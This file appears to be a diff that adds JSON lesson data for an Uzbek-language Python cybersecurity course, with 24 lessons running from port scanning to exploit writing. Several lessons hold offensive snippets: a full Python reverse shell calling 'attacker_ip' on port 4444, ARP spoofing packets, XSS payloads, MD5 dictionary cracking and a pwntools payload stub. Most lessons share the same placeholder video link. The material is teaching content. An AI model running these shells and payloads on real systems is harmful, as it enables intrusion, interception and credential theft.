@@ -1,0 +1,479 @@
+[
+  {
+    "id": 1,
+    "nomi": "Python va kiberxavfsizlikka kirish",
+    "qisqa_mazmun": "Python nima uchun kiberxavfsizlikda muhim? Asosiy tushunchalar",
+    "category": "basic",
+    "level": "Boshlang'ich",
+    "badge": "badge-beginner",
+    "icon": "🐍",    "video_url": "https://youtu.be/blN4Nv0UG5M?si=fy7WPVaKS7Vxa8MN",
+    "libraries": ["sys", "os", "platform"],
+    "cli_commands": [
+      "python3 --version",
+      "pip list",
+      "import sys; print(sys.version)"
+    ],
+    "qurilmalar": ["Python 3.x", "VS Code", "Terminal"],
+    "topshiriq": "Python versiyangizni aniqlang va asosiy modullarni ro'yxatlang",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Python kiberxavfsizlikda</h4><p class='mb-3'>Python kiberxavfsizlik sohasida eng ko'p qo'llaniladigan dasturlash tillaridan biridir. Uning soddaligi va kuchli kutubxonalari tufayli penetration testers, security analystlar va malware researcherlar tomonidan keng qo'llaniladi.</p><h4 class='font-bold mt-4 mb-2'>📌 Asosiy afzalliklari:</h4><ul class='list-disc list-inside'><li>Keng kutubxonalar to'plami</li><li>Platformalararo qo'llab-quvvatlash</li><li>Tez prototiplash</li><li>Katta hamjamiyat</li></ul>"
+  },
+  {
+    "id": 2,
+    "nomi": "Socket dasturlash - Port skanerlash",
+    "qisqa_mazmun": "Socket kutubxonasi yordamida port skanerlash",
+    "category": "basic",
+    "level": "Boshlang'ich",
+    "badge": "badge-beginner",
+    "icon": "🔌",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["socket", "threading", "ipaddress"],
+    "cli_commands": [
+      "import socket",
+      "s = socket.socket()",
+      "s.connect(('target.com', 80))",
+      "s.close()"
+    ],
+    "qurilmalar": ["Python", "Terminal", "Tarmoq"],
+    "topshiriq": "TCP port skaner yarating (1-1024 portlar)",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Socket dasturlash</h4><p class='mb-3'>Socket kutubxonasi tarmoq ulanishlarini yaratish va boshqarish imkonini beradi. Port skanerlash - tarmoq xavfsizligining asosiy usullaridan biri.</p><h4 class='font-bold mt-4 mb-2'>🔍 Port skanerlash turlari:</h4><ul class='list-disc list-inside'><li>TCP Connect scan</li><li>SYN scan (half-open)</li><li>UDP scan</li><li>ACK scan</li></ul>"
+  },
+  {
+    "id": 3,
+    "nomi": "Scapy - Paket manipulyatsiyasi",
+    "qisqa_mazmun": "Scapy bilan paket yaratish va tahlil qilish",
+    "category": "basic",
+    "level": "Boshlang'ich",
+    "badge": "badge-beginner",
+    "icon": "📦",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["scapy"],
+    "cli_commands": [
+      "from scapy.all import *",
+      "pkt = IP(dst='8.8.8.8')/ICMP()",
+      "ans = sr1(pkt, timeout=2)",
+      "ans.show()"
+    ],
+    "qurilmalar": ["Python", "Scapy", "Wireshark"],
+    "topshiriq": "ICMP ping paketi yarating va javobni tahlil qiling",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Scapy - Paket jodugari</h4><p class='mb-3'>Scapy - Python uchun eng kuchli paket manipulyatsiya kutubxonasi. U bilan siz har qanday protokol paketlarini yaratishingiz, yuborishingiz va tahlil qilishingiz mumkin.</p>"
+  },
+  {
+    "id": 4,
+    "nomi": "Nmap - Tarmoq skanerlash",
+    "qisqa_mazmun": "python-nmap bilan avtomatlashtirilgan skanerlash",
+    "category": "basic",
+    "level": "Boshlang'ich",
+    "badge": "badge-beginner",
+    "icon": "🌐",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["nmap", "ipaddress"],
+    "cli_commands": [
+      "import nmap",
+      "nm = nmap.PortScanner()",
+      "nm.scan('127.0.0.1', '22-443')",
+      "nm['127.0.0.1'].state()"
+    ],
+    "qurilmalar": ["Python", "Nmap", "Tarmoq"],
+    "topshiriq": "Lokal tarmog'ingizdagi qurilmalarni skanerlang",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>python-nmap</h4><p class='mb-3'>python-nmap - Nmap skanerining Python interfeysi. Bu kutubxona orqali siz tarmoq skanerlashni avtomatlashtirishingiz mumkin.</p>"
+  },
+  {
+    "id": 5,
+    "nomi": "Requests - Web so'rovlar",
+    "qisqa_mazmun": "HTTP so'rovlar yuborish va tahlil qilish",
+    "category": "basic",
+    "level": "Boshlang'ich",
+    "badge": "badge-beginner",
+    "icon": "🌍",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["requests", "urllib3"],
+    "cli_commands": [
+      "import requests",
+      "r = requests.get('https://example.com')",
+      "print(r.status_code)",
+      "print(r.headers)"
+    ],
+    "qurilmalar": ["Python", "Requests", "Internet"],
+    "topshiriq": "Sayt headerlarini tahlil qiling va server ma'lumotlarini aniqlang",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Requests</h4><p class='mb-3'>Requests - eng ommabop HTTP kutubxona. U bilan siz GET, POST, PUT so'rovlar yuborishingiz, cookie va sessionlarni boshqarishingiz mumkin.</p>"
+  },
+  {
+    "id": 6,
+    "nomi": "BeautifulSoup - Web scraping",
+    "qisqa_mazmun": "HTML parsing va ma'lumot yig'ish",
+    "category": "basic",
+    "level": "Boshlang'ich",
+    "badge": "badge-beginner",
+    "icon": "🕸️",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["beautifulsoup4", "lxml", "html5lib"],
+    "cli_commands": [
+      "from bs4 import BeautifulSoup",
+      "soup = BeautifulSoup(html, 'html.parser')",
+      "soup.find_all('a')",
+      "soup.find(id='content')"
+    ],
+    "qurilmalar": ["Python", "BeautifulSoup", "Requests"],
+    "topshiriq": "Saytdagi barcha havolalarni yig'ing va CSV faylga saqlang",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>BeautifulSoup</h4><p class='mb-3'>BeautifulSoup - HTML va XML fayllarni parsing qilish uchun kuchli kutubxona. OSINT (Open Source Intelligence) uchun juda muhim.</p>"
+  },
+  {
+    "id": 7,
+    "nomi": "Hashlib - Hash funksiyalari",
+    "qisqa_mazmun": "Parol va fayl hash lash",
+    "category": "crypto",
+    "level": "O'rta",
+    "badge": "badge-intermediate",
+    "icon": "🔑",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["hashlib", "hmac"],
+    "cli_commands": [
+      "import hashlib",
+      "hashlib.md5(b'text').hexdigest()",
+      "hashlib.sha256(b'text').hexdigest()",
+      "hashlib.sha512(b'text').hexdigest()"
+    ],
+    "qurilmalar": ["Python", "Hashlib"],
+    "topshiriq": "Faylning MD5 va SHA256 hashini hisoblang",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Hashlib</h4><p class='mb-3'>Hashlib - turli xil hash algoritmlari (MD5, SHA1, SHA256, SHA512) bilan ishlash imkonini beradi. Parollar va fayllar yaxlitligini tekshirishda ishlatiladi.</p>"
+  },
+  {
+    "id": 8,
+    "nomi": "Cryptography - Shifrlash",
+    "qisqa_mazmun": "AES va RSA shifrlash",
+    "category": "crypto",
+    "level": "O'rta",
+    "badge": "badge-intermediate",
+    "icon": "🔒",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["cryptography"],
+    "cli_commands": [
+      "from cryptography.fernet import Fernet",
+      "key = Fernet.generate_key()",
+      "cipher = Fernet(key)",
+      "encrypted = cipher.encrypt(b'secret data')"
+    ],
+    "qurilmalar": ["Python", "Cryptography"],
+    "topshiriq": "Faylni AES algoritmi bilan shifrlang va qayta oching",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Cryptography</h4><p class='mb-3'>Cryptography - professional kriptografiya kutubxonasi. Simmetrik (AES) va asimmetrik (RSA) shifrlashni qo'llab-quvvatlaydi.</p>"
+  },
+  {
+    "id": 9,
+    "nomi": "PyJWT - JSON Web Tokens",
+    "qisqa_mazmun": "JWT tokenlar yaratish va tekshirish",
+    "category": "crypto",
+    "level": "O'rta",
+    "badge": "badge-intermediate",
+    "icon": "🔐",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["pyjwt"],
+    "cli_commands": [
+      "import jwt",
+      "token = jwt.encode({'user': 'admin'}, 'secret', algorithm='HS256')",
+      "decoded = jwt.decode(token, 'secret', algorithms=['HS256'])"
+    ],
+    "qurilmalar": ["Python", "PyJWT"],
+    "topshiriq": "Foydalanuvchi autentifikatsiyasi uchun JWT token yarating",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>PyJWT</h4><p class='mb-3'>PyJWT - JSON Web Token yaratish va tekshirish kutubxonasi. Web ilovalarda autentifikatsiya va sessiya boshqaruvi uchun ishlatiladi.</p>"
+  },
+  {
+    "id": 10,
+    "nomi": "Paramiko - SSH avtomatizatsiyasi",
+    "qisqa_mazmun": "SSH orqali masofaviy boshqaruv",
+    "category": "network",
+    "level": "O'rta",
+    "badge": "badge-intermediate",
+    "icon": "🔧",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["paramiko"],
+    "cli_commands": [
+      "import paramiko",
+      "client = paramiko.SSHClient()",
+      "client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
+      "client.connect('hostname', username='user', password='pass')"
+    ],
+    "qurilmalar": ["Python", "Paramiko", "SSH server"],
+    "topshiriq": "SSH orqali masofaviy serverda komanda bajaring",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Paramiko</h4><p class='mb-3'>Paramiko - SSHv2 protokolining Python implementatsiyasi. Masofaviy serverlarni boshqarish, fayl uzatish va komanda bajarish imkonini beradi.</p>"
+  },
+  {
+    "id": 11,
+    "nomi": "Impacket - Protocol manipulation",
+    "qisqa_mazmun": "SMB, RDP va boshqa protokollar",
+    "category": "network",
+    "level": "Yuqori",
+    "badge": "badge-advanced",
+    "icon": "🔄",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["impacket"],
+    "cli_commands": [
+      "from impacket import smb",
+      "from impacket.smbconnection import SMBConnection",
+      "conn = SMBConnection(remoteName, remoteHost)",
+      "conn.login('user', 'pass')"
+    ],
+    "qurilmalar": ["Python", "Impacket", "Windows tarmog'i"],
+    "topshiriq": "SMB orqali masofaviy fayllarni ro'yxatlang",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Impacket</h4><p class='mb-3'>Impacket - turli xil protokollar (SMB, MSRPC, LDAP, etc.) bilan ishlash uchun kutubxonalar to'plami. Active Directory tahlili va lateral movement uchun juda muhim.</p>"
+  },
+  {
+    "id": 12,
+    "nomi": "Pwntools - Exploit yozish",
+    "qisqa_mazmun": "Buffer overflow va exploit development",
+    "category": "exploit",
+    "level": "Yuqori",
+    "badge": "badge-advanced",
+    "icon": "💥",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["pwntools"],
+    "cli_commands": [
+      "from pwn import *",
+      "r = remote('target.com', 1337)",
+      "r.send(b'payload')",
+      "r.interactive()"
+    ],
+    "qurilmalar": ["Python", "Pwntools", "CTF environment"],
+    "topshiriq": "Buffer overflow exploit yozing",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Pwntools</h4><p class='mb-3'>Pwntools - CTF va exploit yozish uchun maxsus yaratilgan framework. Shellcode yozish, ROP chain qurish va binary tahlil qilish imkonini beradi.</p>"
+  },
+  {
+    "id": 13,
+    "nomi": "YARA - Malware pattern matching",
+    "qisqa_mazmun": "Malware signaturalarini yaratish",
+    "category": "malware",
+    "level": "Yuqori",
+    "badge": "badge-advanced",
+    "icon": "🦠",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["yara-python"],
+    "cli_commands": [
+      "import yara",
+      "rules = yara.compile(filepath='rules.yara')",
+      "matches = rules.match(data=file_data)",
+      "for match in matches: print(match.rule)"
+    ],
+    "qurilmalar": ["Python", "YARA"],
+    "topshiriq": "Berilgan malware uchun YARA qoidasi yozing",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>YARA</h4><p class='mb-3'>YARA - malware identifikatsiyasi uchun pattern matching tool. Malware signaturalarini yaratish va fayllarni tekshirish imkonini beradi.</p>"
+  },
+  {
+    "id": 14,
+    "nomi": "Pefile - PE fayl tahlili",
+    "qisqa_mazmun": "Windows executable fayllarni tahlil qilish",
+    "category": "malware",
+    "level": "Yuqori",
+    "badge": "badge-advanced",
+    "icon": "📁",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["pefile"],
+    "cli_commands": [
+      "import pefile",
+      "pe = pefile.PE('malware.exe')",
+      "pe.print_info()",
+      "for entry in pe.DIRECTORY_ENTRY_IMPORT: print(entry.dll)"
+    ],
+    "qurilmalar": ["Python", "Pefile", "Windows executable"],
+    "topshiriq": "EXE faylining import va export funksiyalarini tahlil qiling",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Pefile</h4><p class='mb-3'>Pefile - Windows PE (Portable Executable) fayllarini tahlil qilish kutubxonasi. Malware tahlilida fayl strukturasini o'rganish uchun ishlatiladi.</p>"
+  },
+  {
+    "id": 15,
+    "nomi": "Capstone - Disassembler",
+    "qisqa_mazmun": "Machine code disassembly",
+    "category": "malware",
+    "level": "Yuqori",
+    "badge": "badge-advanced",
+    "icon": "🔍",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["capstone"],
+    "cli_commands": [
+      "from capstone import *",
+      "md = Cs(CS_ARCH_X86, CS_MODE_32)",
+      "for i in md.disasm(code, 0x1000):",
+      "    print(f'0x{i.address}: {i.mnemonic} {i.op_str}')"
+    ],
+    "qurilmalar": ["Python", "Capstone"],
+    "topshiriq": "Berilgan shellcode ni disassemble qiling",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Capstone</h4><p class='mb-3'>Capstone - lightweight multi-architecture disassembly framework. Machine codeni assembly kodiga o'girish imkonini beradi.</p>"
+  },
+  {
+    "id": 16,
+    "nomi": "Pandas - Log tahlili",
+    "qisqa_mazmun": "Katta hajmdagi loglarni tahlil qilish",
+    "category": "analysis",
+    "level": "O'rta",
+    "badge": "badge-intermediate",
+    "icon": "📊",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["pandas", "numpy"],
+    "cli_commands": [
+      "import pandas as pd",
+      "df = pd.read_csv('access.log', sep=' ')",
+      "df['ip'].value_counts().head(10)",
+      "df.groupby('status').size()"
+    ],
+    "qurilmalar": ["Python", "Pandas", "Log fayllar"],
+    "topshiriq": "Apache access log ni tahlil qiling va eng ko'p murojaat qilgan IP larni aniqlang",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Pandas</h4><p class='mb-3'>Pandas - ma'lumotlarni tahlil qilish uchun kuchli kutubxona. Katta hajmdagi log fayllarni tahlil qilish, statistika yig'ish va vizualizatsiya qilish imkonini beradi.</p>"
+  },
+  {
+    "id": 17,
+    "nomi": "SQL Injection avtomatizatsiyasi",
+    "qisqa_mazmun": "SQLMap va Python integratsiyasi",
+    "category": "web",
+    "level": "O'rta",
+    "badge": "badge-intermediate",
+    "icon": "💉",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["requests", "subprocess"],
+    "cli_commands": [
+      "import subprocess",
+      "result = subprocess.run(['sqlmap', '-u', url, '--batch'], capture_output=True)",
+      "print(result.stdout.decode())"
+    ],
+    "qurilmalar": ["Python", "SQLMap", "Web server"],
+    "topshiriq": "SQLMap bilan avtomatlashtirilgan SQL injection testi o'tkazing",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>SQL Injection</h4><p class='mb-3'>SQL injection - web ilovalardagi eng xavfli zaifliklardan biri. SQLMap bu zaifliklarni avtomatik aniqlash va exploit qilish imkonini beradi.</p>"
+  },
+  {
+    "id": 18,
+    "nomi": "XSS detection",
+    "qisqa_mazmun": "Cross-Site Scripting zaifliklarini aniqlash",
+    "category": "web",
+    "level": "O'rta",
+    "badge": "badge-intermediate",
+    "icon": "⚠️",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["requests", "beautifulsoup4"],
+    "cli_commands": [
+      "payloads = ['<script>alert(1)</script>', '\"><img src=x onerror=alert(1)>']",
+      "for payload in payloads:",
+      "    response = requests.get(url, params={'q': payload})",
+      "    if payload in response.text: print('XSS found!')"
+    ],
+    "qurilmalar": ["Python", "Web browser", "Burp Suite"],
+    "topshiriq": "XSS payload lar yaratib, saytni test qiling",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>XSS</h4><p class='mb-3'>XSS (Cross-Site Scripting) - foydalanuvchi brauzerida malicious code bajarish imkonini beruvchi zaiflik.</p>"
+  },
+  {
+    "id": 19,
+    "nomi": "Directory busting",
+    "qisqa_mazmun": "Yashirin direktorilarni topish",
+    "category": "web",
+    "level": "O'rta",
+    "badge": "badge-intermediate",
+    "icon": "📂",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["requests", "threading"],
+    "cli_commands": [
+      "import threading",
+      "wordlist = ['admin', 'backup', 'config', 'wp-admin', 'phpmyadmin']",
+      "for word in wordlist:",
+      "    r = requests.get(f'{url}/{word}')",
+      "    if r.status_code == 200: print(f'Found: {word}')"
+    ],
+    "qurilmalar": ["Python", "Wordlist", "Threading"],
+    "topshiriq": "Multi-threaded directory scanner yarating",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Directory busting</h4><p class='mb-3'>Directory busting - web serverdagi yashirin direktorilarni topish usuli. Ko'pincha admin panel, backup fayllar va konfiguratsiya fayllarini topish uchun ishlatiladi.</p>"
+  },
+  {
+    "id": 20,
+    "nomi": "Password cracking",
+    "qisqa_mazmun": "Parollarni brute-force qilish",
+    "category": "crypto",
+    "level": "Yuqori",
+    "badge": "badge-advanced",
+    "icon": "🔓",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["hashlib", "itertools", "multiprocessing"],
+    "cli_commands": [
+      "import hashlib",
+      "with open('wordlist.txt') as f:",
+      "    for word in f:",
+      "        if hashlib.md5(word.strip().encode()).hexdigest() == target_hash:",
+      "            print(f'Password found: {word}')"
+    ],
+    "qurilmalar": ["Python", "Wordlist", "Hash"],
+    "topshiriq": "Dictionary attack orqali MD5 hashni oching",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Password cracking</h4><p class='mb-3'>Password cracking - hash qilingan parollarni tiklash jarayoni. Dictionary attack va brute force usullari mavjud.</p>"
+  },
+  {
+    "id": 21,
+    "nomi": "Network sniffing",
+    "qisqa_mazmun": "Tarmoq trafigini ushlash va tahlil qilish",
+    "category": "network",
+    "level": "Yuqori",
+    "badge": "badge-advanced",
+    "icon": "👂",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["scapy", "socket"],
+    "cli_commands": [
+      "from scapy.all import *",
+      "pkts = sniff(count=10)",
+      "pkts.summary()",
+      "wrpcap('capture.pcap', pkts)"
+    ],
+    "qurilmalar": ["Python", "Scapy", "Network interface"],
+    "topshiriq": "Tarmoq trafigini ushlab, HTTP so'rovlarni tahlil qiling",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Network sniffing</h4><p class='mb-3'>Network sniffing - tarmoq orqali o'tayotgan paketlarni ushlash va tahlil qilish. Man-in-the-Middle attacklar uchun asos.</p>"
+  },
+  {
+    "id": 22,
+    "nomi": "ARP spoofing",
+    "qisqa_mazmun": "ARP poisoning orqali MITM",
+    "category": "network",
+    "level": "Ekspert",
+    "badge": "badge-expert",
+    "icon": "🎭",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["scapy", "time"],
+    "cli_commands": [
+      "from scapy.all import *",
+      "arp = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=target_mac)",
+      "send(arp, count=5, inter=2)"
+    ],
+    "qurilmalar": ["Python", "Scapy", "Local network"],
+    "topshiriq": "ARP spoofing attack yarating va trafikni yo'naltiring",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>ARP spoofing</h4><p class='mb-3'>ARP spoofing - lokal tarmoqda MITM (Man-in-the-Middle) attack qilish usuli. ARP cache ni zaharlash orqali trafikni o'ziga yo'naltirish.</p>"
+  },
+  {
+    "id": 23,
+    "nomi": "Reverse shell",
+    "qisqa_mazmun": "Masofaviy shell yaratish",
+    "category": "exploit",
+    "level": "Ekspert",
+    "badge": "badge-expert",
+    "icon": "🐚",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["socket", "subprocess", "pty"],
+    "cli_commands": [
+      "import socket,subprocess,os,pty",
+      "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
+      "s.connect(('attacker_ip',4444))",
+      "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)",
+      "pty.spawn('/bin/bash')"
+    ],
+    "qurilmalar": ["Python", "Socket", "Two machines"],
+    "topshiriq": "Reverse shell yarating va masofaviy boshqaruv o'rnating",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Reverse shell</h4><p class='mb-3'>Reverse shell - target mashinadan attacker mashinasiga teskari ulanish. Firewalllarni chetlab o'tish va masofaviy boshqaruv o'rnatish imkonini beradi.</p>"
+  },
+  {
+    "id": 24,
+    "nomi": "Yakuniy loyiha: Security Scanner",
+    "qisqa_mazmun": "To'liq security scanner yaratish",
+    "category": "project",
+    "level": "Ekspert",
+    "badge": "badge-expert",
+    "icon": "🎯",
+    "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
+    "libraries": ["Barcha o'rganilgan kutubxonalar"],
+    "cli_commands": [
+      "python security_scanner.py --target example.com --scan all",
+      "python security_scanner.py --report pdf",
+      "python security_scanner.py --help"
+    ],
+    "qurilmalar": ["Python", "Barcha kutubxonalar"],
+    "topshiriq": "24 soat davomida o'rgangan barcha kutubxonalarni o'z ichiga olgan security scanner yarating",
+    "batafsil": "<h4 class='text-xl font-bold mb-3'>Yakuniy loyiha</h4><p class='mb-3'>Yakuniy loyiha - o'rgangan barcha kutubxonalarni o'z ichiga olgan to'liq security scanner. Port scanning, web vulnerability detection, network sniffing, password cracking va boshqa funksiyalar.</p><p class='mt-3'>Loyiha quyidagi modullardan iborat bo'ladi:<br>- Port scanner<br>- Web vulnerability scanner<br>- Network sniffer<br>- Password cracker<br>- Log analyzer<br>- Report generator</p>"
+  }
+]
